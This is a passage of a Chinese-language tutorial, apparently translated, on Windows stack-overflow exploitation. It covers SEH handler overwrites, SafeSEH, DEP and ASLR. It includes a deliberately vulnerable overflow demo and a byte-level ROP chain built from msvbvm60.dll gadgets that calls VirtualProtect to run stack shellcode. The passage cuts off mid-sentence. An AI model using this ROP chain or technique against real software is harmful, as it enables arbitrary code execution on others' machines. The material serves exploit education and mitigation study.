&#123;</span><br><span class="line"></span><br><span class="line">PEXCEPTION_REGISTRATION_RECORD Next;</span><br><span class="line"></span><br><span class="line">PEXCEPTION_DISPOSITION Handler;</span><br><span class="line"></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><p>在内部，指向SEH handler列表的指针都存储在每个线程的TEB的偏移量0处，并且每个EXCEPTION_REGISTION_RECORD都链接到下一个。如果handler不能正确处理抛出的异常，它会将执行权移交给下一个handler，以此类推。</p><p><img src="/.io//Picture11-1707050428583.png" alt="img"></p><p>因此，SEH实际上为攻击者提供了绕过栈Cookie的理想方法。我们可以利用栈溢出，覆盖现有的SHE handler(肯定至少会有一个)，然后让应用程序崩溃(考虑到我们有能力破坏栈内存，这肯定不在话下)。这将导致在易受攻击函数最后调用__SECURITY_CHECK_COOKIE之前，EIP被重定向到EXCEPTION_REGISTION_RECORD结构体中被覆盖后的handler地址。因此，在执行shellcode之前，应用程序根本没有机会发现其栈已被破坏。因此，我们可以用自定义的SEH handler喷射栈，覆盖现有的EXCEPTION_REGISTRATION_RECORD结构体。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">EXCEPTION_DISPOSITION __cdecl <span class="title">FakeHandler</span><span class="params">(EXCEPTION_RECORD* pExceptionRecord, <span class="type">void</span>* pEstablisherFrame, CONTEXT* pContextRecord, <span class="type">void</span>* pDispatcherContext)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;... fake exception handler executed at 0x%p\r\n&quot;</span>), FakeHandler);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">wmain</span><span class="params">(<span class="type">int32_t</span> nArgc, <span class="type">const</span> <span class="type">wchar_t</span>* pArgv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> dwOverflowSize = <span class="number">0x20000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* pOverflowBuf = (<span class="type">uint8_t</span>*)<span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), <span class="number">0</span>, dwOverflowSize);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;... spraying %d copies of fake exception handler at 0x%p to the stack...\r\n&quot;</span>), dwOverflowSize / <span class="number">4</span>, FakeHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint32_t</span> dwOffset = <span class="number">0</span>; dwOffset &lt; dwOverflowSize; dwOffset += <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line">*(<span class="type">uint32_t</span>*)&amp;pOverflowBuf[dwOffset] = *(<span class="type">uint32_t</span>*)FakeHandler;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;... passing %d bytes of data to vulnerable function\r\n&quot;</span>), dwOverflowSize);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Overflow</span>(pOverflowBuf, dwOverflowSize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/.io//v2-cb24919b0ed83d7d0ad9fef761c7f0e7_1440w-1707050428583.webp" alt="img"></p><p>我们得到的不是EXE中FakeHandler函数上的断点，而是得到一个STATUS_INVALID_EXCEPTION_HANDLER异常(代码0xC00001A5)。这是一个源于SafeSEH的安全缓解异常。SafeSEH是一个安全缓解措施，仅适用于32位PE文件。在64位PE文件中，一个名为IMAGE_DIRECTORY_ENTRY_EXCEPTION的永久性（非可选）数据目录取代了原来在32位PE文件中的IMAGE_DIRECTORY_ENTRY_RIGHT数据目录。SafeSEH与GS特性都是在Visual Studio 2003版本中发布的，随后在Visual Studio 2005版本中成为了默认设置。</p><p>什么是SafeSEH，它是如何工作的？</p><ol><li>在Visual Studio 2019中，SafeSEH是默认设置的。它通过使用&#x2F;SAFESEH标志进行配置，我们可以在Project -&gt; Properties -&gt; Linker -&gt; Advanced -&gt; Image Has Safe Exception Handlers中进行相应的设置。</li><li>SafeSEH编译的PE文件含有一个有效的SEH handler地址列表，位于名为SEHandlerTable的表中，我们可以在其IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG数据目录中指定。</li><li>每当触发异常时，在执行EXCEPTION_REGISTRATION_RECORD链表中的每个handler的地址之前，Windows会检查该handler是否位于映像内存的范围内（表明它与加载的模块有关），如果是的话，就会用它的SEHandlerTable检查这个handler地址对有关模块是否有效。</li></ol><p>在上图中，我们是通过栈溢出的方式来注册handler的，通过这种方式创建的handler是无法被编译器所识别的（因此，也不会添加到SEHandlerTable中）。通常情况下，编译器会将作为__try __except语句的副作用而创建的handler添加到这个表中。在禁用SafeSEH后，再次运行这段代码会导致栈溢出，执行被喷入的handler。</p><p>下图所示为栈溢出，导致执行了伪造的SEH handler，该handler被编译为PE EXE映像的主映像。</p><p><img src="/.io//Picture15-1707050428583.png" alt="img"></p><p>当然，虽然自2005年以来Visual Studio就默认启用了SafeSEH，但是，在现代应用程序中是否仍然存在禁用了SafeSEH的已加载PE代码呢？在自己探索这个问题的时候，我写了一个PE文件扫描工具，以便在系统范围内检测每个文件是否存在（或缺乏）漏洞缓解措施。当我使用这个扫描工具处理我的Windows 10虚拟机上的SysWOW64文件夹（并对非SafeSEH PEs进行过滤）后，结果令人大跌眼镜。</p><p><img src="/.io//Picture16-1707050428583.png" alt="img"></p><p>看来，微软本身也有相当多的非SafeSEH PE，特别是至今仍在随Windows10一起提供的DLL。扫描我的Program Files文件夹后，得到的结果则更有说服力，大约有7%的PE文件缺乏SafeSEH保护。事实上，尽管我的虚拟机上安装的第三方应用程序很少，但从7-zip、Sublime Text到VMWare Tools，几乎每个应用程序都至少含有一个非SafeSEH模块。即使在进程的地址空间中只有一个这样的模块，也足以绕过其栈Cookie缓解措施，进而使用本文中探讨的技术利用栈溢出漏洞。</p><p>值得注意的是，在如下所示两种不同的情况下，SafeSEH可以被认为对PE生效的，它们是我的工具在扫描中使用的标准：</p><ol><li>在IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG数据目录中存在上述的SEHandlerTable以及SEHandlerCount大于零的情况。</li><li>IMAGE_DLLCHARACTERISTICS_NO_SEH标志被设置在IMAGE_OPTIONAL_HEADER.DllCharacteristics的header字段。</li></ol><p>假设一个没有采用SafeSEH措施的模块被加载到一个易受攻击的应用程序中，对于exploit编写者来说，仍然还面临令一个重要的障碍。回到图10，尽管一个伪造的SEH HANDLER通过栈溢出被成功执行，但是这个handler被编译到了PE EXE映像本身中。所以，为了实现任意代码执行，我们需要执行一个存储在栈上的伪造SEH HANDLER（一个shellcode）。</p><h2 id="DEP-amp-ASLR"><a href="#DEP-amp-ASLR" class="headerlink" title="DEP &amp; ASLR"></a>DEP &amp; ASLR</h2><p>由于存在DEP和ASLR防御机制，在栈上将我们的shellcode用作伪异常handler存在多个障碍：</p><ol><li>由于存在ASLR机制，我们不知道Shellcode在栈上的地址，因此无法将其嵌入到我们的溢出内容中以喷射到栈中。</li><li>由于存在DEP机制，在默认情况下，栈本身以及扩展的shellcode是不可执行的。</li></ol><p>随着2004年Windows XP SP2的问世，DEP首次在Windows世界得到了广泛的采用，并且从那时起，DEP已经成为当今使用的几乎所有现代应用程序和操作系统的普遍特性。它是通过使用硬件层内存页的PTE头部中的一个特殊位（NX，也就是不可执行位）来实现的，默认情况下，该位将在Windows中所有新分配的内存上被设置。这意味着攻击者必须显式创建可执行内存区域，方法是通过诸如KERNEL32.DLL!VirtualAlloc之类的API分配具有可执行权限的新内存，或者通过使用诸如KERNEL32.DLL!VirtualProtect之类的API将现有的非可执行内存修改为可执行的。这样做的一个副作用是，由于栈和堆在默认情况下都是不可执行的，因此，我们无法直接从这些位置执行shellcode，换句话说，我们必须首先为它开辟一个可执行的内存区域。</p><p>从exploit编写的角度来看，理解DEP的关键在于，DEP是一种要么全有要么全无的缓解措施：要么应用于进程内的所有内存，要么不应用于进程内的所有内存。如果使用&#x2F;NXCOMPAT标志编译生成进程的主EXE，则整个进程将启用DEP。与诸如SafeSEH或ASLR之类的缓解措施形成鲜明对比的是，并不存在非DEP DLL模块之类的东西。</p><p>从exploit编写的角度来看，DEP的解决方案早已被理解为面向返回的编程（ROP）。原则上，现有的可执行内存将与攻击者提供的栈一起以小片段的形式回收，以实现为我们的shellcode划分可执行区域的目标。创建自己的ROP链时，我选择使用KERNEL32.DLL!VirtualProtect API，以便使存放shellcode的栈区域是可执行的。该API的原型如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">DWORDflNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>在ASLR问世之前，如果可以通过溢出来控制栈，就可以将这五个参数作为常量植入栈，然后触发一个EIP重定向，使其指向KERNEL32.DLL中的VirtualProtect函数（其基地址是静态的）。在这里，唯一的障碍是——我们不知道作为第一个参数传递或作为返回地址使用的shellcode的确切地址。后来，攻击者利用NOP sledding技术（在shellcode的前面填充一大段NOP指令，即0x90）解决了这个问题。然后，exploit编写者可以推断出shellcode在栈中的大致区域，并在这个范围内选取一个地址并将其直接植入溢出内容中，从而通过NOP sled将这个猜测转化为精确的代码执行。</p><p>随着2006年Windows Vista中ASLR的出现，ROP链的创建变得有些棘手，因为现在：</p><ol><li>DLL的基址和VirtualProtect的基址变得不可预测。</li><li>shellcode的地址难以猜测。</li><li>包含可执行代码片段的模块的地址变得不可预测。</li></ol><p>这不仅对ROP链提出了更多的要求，同时，还要求其实现要更加精确，因此，NOP sled（1996年左右的经典形式）成为ASLR时代的牺牲品。这也导致了ASLR绕过技术成为了DEP绕过技术的前提条件。如果不绕过ASLR，从而至少定位含有漏洞的进程中一个模块的基地址，就无法知道ROP Gadget的地址，从而无法执行ROP链，也就无法调用VirtualProtect函数来绕过DEP。</p><p>要创建一个现代的ROP链，我们首先需要这样一个模块：我们可以在运行时预测其基地址的模块。在大多数现代漏洞利用技术中，这是通过使用内存泄漏漏洞来实现的（这个主题将在本系列的字符串格式错误和堆损坏续集中加以探讨）。为了简单起见，我选择在易受攻击进程的地址空间中引入一个非ASLR模块（来自我的Windows 10虚拟机的SysWOW64目录）。在继续之前，必须了解非ASLR模块背后的概念（以及在exploit编写过程中的作用）。</p><p>从exploit编写的角度来看，以下是我认为最有价值的ASLR概念：</p><ol><li>在Visual Studio 2019中，ASLR是默认设置的。它使用&#x2F;DYNAMICBASE标志进行配置，我们可以在项目设置的Project -&gt; Properties -&gt; Linker -&gt; Advanced -&gt; Randomized Base Address字段中进行配置。</li><li>当使用该标志编译PE文件时，它（在默认情况下）总是导致创建一个IMAGE_DIRECTORY_ENTRY_BASERELOC数据目录（存储在PE文件的.reloc段中）。如果没有这些重定位信息，Windows就无法重建模块的基地址并执行ASLR。</li><li>编译后的PE将在其IMAGE_OPTIONAL_HEADER.DllCharacteristics头部中设置IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE标志。</li><li>当PE被加载时，将为其选择一个随机的基地址，并且其代码&#x2F;数据中的所有绝对地址都将使用重定位部分进行重定位。这个随机地址在每次启动时都是不同的。</li><li>如果用于启动进程的主PE(EXE)启用了ASLR，也会导致栈和堆被随机化。</li></ol><p>您可能会注意到，这实际上会导致两种不同的情况，其中可能会出现非ASLR模块。第一种情况是显式编译模块以排除ASLR标志(或在该标志存在之前编译)，第二种情况是设置了ASLR标志，但由于缺少重新定位而无法应用。</p><p>开发人员的一个常见错误是，在他们的编译器中联合使用ASLR标志和“strip relocations”选项，他们认为这样生成的二进制文件是受ASLR保护的，而实际上它仍然是易受攻击的。从历史上看，非ASLR模块非常常见，甚至在Windows7+ Web浏览器攻击中被滥用，并在商业恶意软件中大获成功。现在，这类模块已经逐渐变得稀缺，这在很大程度上是因为ASLR已经成为诸如Visual Studio之类的IDE中默认启用的一种安全缓解措施。令人惊讶的是，我的扫描软件在我的Windows10虚拟机上发现了大量非ASLR模块，许多位于在System32和SysWOW64目录中。</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture19.png" alt="img"></p><p>值得注意的是，图12中显示的所有非ASLR模块都具有非常不同（且唯一）的基地址。这些都是Microsoft编译的PE文件，其本意就是不使用ASLR，之所以这么做，很可能是出于性能或兼容性的原因。它们将始终加载到image_optional_header.imageBase中指定的映像基地址处（上图中突出显示的值）。显然，这些独特的映像基地址是编译器在创建时随机选择的。通常情况下，PE文件都会在其PE头部中包含默认映像基地址值，如0x00400000（用于EXE）和0x1000000（用于DLL）。这种专门创建的非ASLR模块与因失误而创建的非ASLR模块（如下图所示）形成了鲜明的对比。</p><p><img src="/.io//Picture20-1707050428583.png" alt="img"></p><p>这是在最新版本的HXD Hex Editor中作为重定位剥离(不知情的开发人员的旧优化习惯)副作用而创建的非ASLR模块的一个主要例子。值得注意的是，您可以在上面的图13中看到，与图12中的模块(具有随机基地址)不同，这些模块都具有相同的默认映像基地址0x00400000（已经被编译到它们的PE头部中）。这与其PE头部中存在的IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE标志相结合，表明编译它们的开发人员假设它们将使用随机地址进行加载，而不是在0x00400000处进行加载，并认为它们会受到ASLR机制的保护。然而，在实践中，我们可以肯定它们总是被加载到地址0x00400000处，尽管已经启用了ASLR——因为在没有重新定位数据的情况下，操作系统是无法在初始化期间重新设置它们的基地址的。</p><p>通过回收非ASLR模块的可执行段(通常是它们的.text段)中的代码，我们能够构造相应的ROP链来调用KERNEL32.DLL!VirtualProtect API，并为栈上shellcode禁用DEP保护机制。</p><p>在图12中可以看出，我选择了SysWOW64中的非ASLR模块msvbvm60.dll作为ROP链，因为它不仅缺少ASLR保护，而且还缺少SafeSEH(考虑到我们必须知道在溢出时写入栈的伪造SEH handler&#x2F;stack pivot gadget的地址，这是一个至关重要的细节)。此外，这里还通过IAT导入了KERNEL32.DLL!VirtualProtect，这一细节极大地简化了ROP链的创建过程。</p><h2 id="创建ROP链"><a href="#创建ROP链" class="headerlink" title="创建ROP链"></a>创建ROP链</h2><p>第一步，我使用Ropper从msvbvm60.dll中提取所有可能有用的可执行代码片段（以RET、JMP或CALL指令结束）。实际上，我创建ROP链有三个主要意图：</p><ol><li>通过从msvbvm60.dll的IAT加载其地址来调用KERNEL32.DLL!VirtualProtect（以绕过KERNEL32.DLL的ASLR）。</li><li>动态控制VirtualProtect的第一个参数，使其指向栈上的shellcode（以绕过DEP）。</li><li>人为控制VirtualProtect的返回地址，令其返回时，动态地执行栈上的shellcode（现在的权限是+RWX）。</li></ol><p>在编写ROP链的时候，我先用汇编语言描述所需逻辑的伪代码，然后，设法用ROP Gadget来复现该逻辑。</p><p>下为ROP链的伪代码逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget #1 | MOV REG1, &lt;Address of VirtualProtect IAT thunk&gt; ; RET</span><br><span class="line"></span><br><span class="line">Gadget #2 | MOV REG2, &lt;Address of JMP ESP - Gadget #6&gt; ; RET</span><br><span class="line"></span><br><span class="line">Gadget #3 | MOV REG3, &lt;Address of gadget #5&gt; ; RET</span><br><span class="line"></span><br><span class="line">Gadget #4 | PUSH ESP ; PUSH REG3 ; RET</span><br><span class="line"></span><br><span class="line">Gadget #5 | PUSH REG2 ; JMP DWORD [REG1]</span><br><span class="line"></span><br><span class="line">Gadget #6 | JMP ESP</span><br></pre></td></tr></table></figure><p>值得注意的是，在上面精心构造的的逻辑中，使用了msvbvm60.dll中一个包含VirtualProtect地址的解除引用的IAT thunk地址，以解决KERNEL32.DLL的ASLR问题。Windows在加载msvbvm60.dll时，会为我们解析VirtualProtect的地址，并且这个地址将始终保存在msvbvm60.dll内的同一位置处。这里，我打算使用JMP指令来调用它，而不是CALL指令。这是因为我需要为调用VirtualProtect创建一个伪造的返回地址，这个返回地址将导致shellcode（现在已经摆脱了DEP）直接执行。这个伪造的返回地址会指向一个JMP ESP gadget。我这么做的理由是：尽管不知道（也无法知道）通过溢出写入栈中的shellcode的具体位置，但该gadget返回后，ESP会指向ROP链的末端，而我可以精心构造溢出内容，使shellcode正好位于这个ROP链后面。</p><p>此外，我在第4个gadget中也使用了同样的技术：通过两个push指令让ESP动态生成VirtualProtect的第一个参数。与JMP ESP指令不同（其中ESP会直接指向我的shellcode），这里的ESP会与我的shellcode的地址略有偏差（运行时ESP与ROP链末端的距离）。这并不是一个问题，因为充其量只是在ROP链的末端除了shellcode本身之外，还将禁用DEP。</p><p>在构建ROP链的过程中（也就是将上述逻辑付诸实施过程中），我发现gadget #4（我的伪代码gadget中最稀有和最不可替代的一个）没有出现在msvbvm60.dll中。这个挫折是一个很好的例子，说明了为什么在任何公共漏洞利用代码中几乎每个ROP链都在使用PUSHAD指令，而不是类似于我所描述的伪代码逻辑。</p><p>简而言之，PUSHAD指令允许exploit编写者动态地将ESP的值（以及栈上的shellcode）与所有其他相关的KERNEL32.DLL!VirtualProtect参数一起放到栈上，而无需使用任何罕见的gadget。他们所有需要做的就是正确填充每个通用寄存器的值，然后执行PUSHAD ; RET gadget来完成攻击。关于这方面的详细介绍，请访问Corelan撰写的“ Exploit writing tutorial part 10 : Chaining DEP with ROP – the Rubik’s[TM] Cube”一文。最终，我们的ROP链需要通过如下方式设置相关的寄存器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">EAX = NOP sled</span><br><span class="line"></span><br><span class="line">ECX = Old protection (writable address)</span><br><span class="line"></span><br><span class="line">EDX = PAGE_EXECUTE_READWRITE</span><br><span class="line"></span><br><span class="line">EBX = Size</span><br><span class="line"></span><br><span class="line">EBP = VirtualProtect return address (JMP ESP)</span><br><span class="line"></span><br><span class="line">ESI = KERNEL32.DLL!VirtualProtect</span><br><span class="line"></span><br><span class="line">EDI = ROPNOP</span><br></pre></td></tr></table></figure><p>在实践中，上面的逻辑可以被ROP gadget替换，具体如下面的伪码所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Gadget #1: MOV EAX, &lt;msvbvm60.dll!VirtualProtect&gt;</span><br><span class="line"></span><br><span class="line">Gadget #2: MOV ESI, DWORD [ESI]</span><br><span class="line"></span><br><span class="line">Gadget #3: MOV EAX, 0x90909090</span><br><span class="line"></span><br><span class="line">Gadget #4: MOV ECX, &lt;msvbvm60.dll!.data&gt;</span><br><span class="line"></span><br><span class="line">Gadget #5: MOV EDX, 0x40</span><br><span class="line"></span><br><span class="line">Gadget #6: MOV EBX, 0x2000</span><br><span class="line"></span><br><span class="line">Gadget #7: MOV EBP,</span><br><span class="line"></span><br><span class="line">Gadget #8: MOV EDI,</span><br><span class="line"></span><br><span class="line">Gadget #9: PUSHAD</span><br><span class="line"></span><br><span class="line">Gadget #10: ROPNOP</span><br><span class="line"></span><br><span class="line">Gadget #11: JMP ESP</span><br></pre></td></tr></table></figure><p>上面的伪码逻辑最终可以转换为来自msvbvm60.dll的ROP链数据，具体如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> RopChain[] =</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x1e\x00\x66&quot;</span> <span class="comment">// 0x66001e54 | Gadget #1 | POP ESI ; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xd0\x10\x00\x66&quot;</span> <span class="comment">// 0x660010d0 -&gt; ESI | &lt;msvbvm60.dll!VirtualProtect thunk&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xfc\x50\x05\x66&quot;</span> <span class="comment">// 0x660550fc | Gadget #2 | MOV EAX, DWORD [ESI] ; POP ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xef\xbe\xad\xde&quot;</span> <span class="comment">// Junk</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf8\x9f\x0f\x66&quot;</span> <span class="comment">// 0x660f9ff8 | Gadget #3 | XCHG EAX, ESI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x1f\x98\x0e\x66&quot;</span> <span class="comment">// 0x660e981f | Gadget #4 | POP EAX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span> <span class="comment">// NOP sled -&gt; EAX | JMP ESP will point here</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf0\x1d\x00\x66&quot;</span> <span class="comment">// 0x66001df0 | Gadget #5 | POP EBP; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xea\xcb\x01\x66&quot;</span> <span class="comment">// 0x6601CBEA -&gt; EBP |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x10\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001f10 | Gadget #6 | POP EBX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\x20\x00\x00&quot;</span> <span class="comment">// 0x2000 -&gt; EBX | VirtualProtect() | Param #2 | dwSize</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x21\x44\x06\x66&quot;</span> <span class="comment">// 0x66064421 | Gadget #7 | POP EDX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span> <span class="comment">// 0x40 -&gt; EDX | VirtualProtect() | Param #3 | flNewProtect | PAGE_EXECUTE_READWRITE</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf2\x1f\x00\x66&quot;</span> <span class="comment">// 0x66001ff2 | Gadget #8 | POP ECX; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x00\xa0\x10\x66&quot;</span> <span class="comment">// 0x6610A000 -&gt; ECX | VirtualProtect() | Param #4 | lpflOldProtect</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x5b\x57\x00\x66&quot;</span> <span class="comment">// 0x6600575b | Gadget #9 | POP EDI; RET</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\xf9\x28\x0f\x66&quot;</span> <span class="comment">// 0x660F28F9 -&gt; EDI |</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\x54\x12\x05\x66&quot;</span> <span class="comment">// 0x66051254 | Gadget #10 | PUSHAD; RET</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x660F28F9 | Gadget #11 | ROPNOP | returns into VirtualProtect</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x6601CBEA | Gadget #12 | PUSH ESP; RET | return address from VirtualProtect</span></span><br></pre></td></tr></table></figure><h2 id="执行任意代码"><a href="#执行任意代码" class="headerlink" title="执行任意代码"></a>执行任意代码</h2><p>构建了ROP链，也搞定了劫持EIP的方法，现在剩下的唯一任务就是构建exploit。为此，我们必须了解当伪造的SEH handler收到程序的控制权时栈的布局情况。理想情况下，我们当然希望ESP直接指向ROP链的顶部，并结合EIP重定向，使其指向链中的第一个gadget。在实践中，这是不可能的。让我们回顾一下栈喷射代码，并在在伪造的handler的开始处设置一个断点，以观察发生溢出和EIP劫持后栈的状态。</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture23.png" alt="img"></p><p>在右边的突出显示的区域，我们可以看到栈的底部位于0x010FF3C0处。然而，您可能会注意到，栈中的值都不是我们溢出的内容——大家可能还记得，在发生访问冲突之前，我们在不断向栈中喷射伪造的SEH handler的地址。在左边突出显示的区域，我们可以看到，我们的溢出内容起始于0x010FFA0C附近。因此，在异常发生后，NTDLL.DLL让ESP向我们用溢出内容覆盖的栈区域下方偏移了0x64C字节（记住，栈是向下生长的，而不是向上生长的）。有了这些信息，就不难理解发生了什么。当NTDLL.DLL处理异常时，它开始使用异常发生时ESP下方的栈区域，而这个区域是我们鞭长莫及的，因此，也就无法写入我们的ROP链。</p><p>因此，这就产生了一个有趣的问题。也就是说，要想执行ROP链，我们需要让伪造的SEH 